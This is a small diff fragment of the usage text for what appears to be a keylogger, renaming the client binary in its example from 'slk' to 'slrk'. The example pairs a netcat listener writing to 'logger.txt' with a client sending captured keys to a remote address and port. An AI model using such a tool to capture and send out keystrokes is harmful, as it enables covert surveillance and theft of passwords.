@@ -13,6 +13,6 @@ OPTIONS:<br>
 <br>
 EXAMPLE<br>
 Server$ nc lvp 8888 > logger.txt<br><br>
-Client#./slk -m remote -a 127.0.0.1 -p 8888<br>
+Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
 __________________________________________________________________________
 <br>(Keys are mapped on English keyboard)
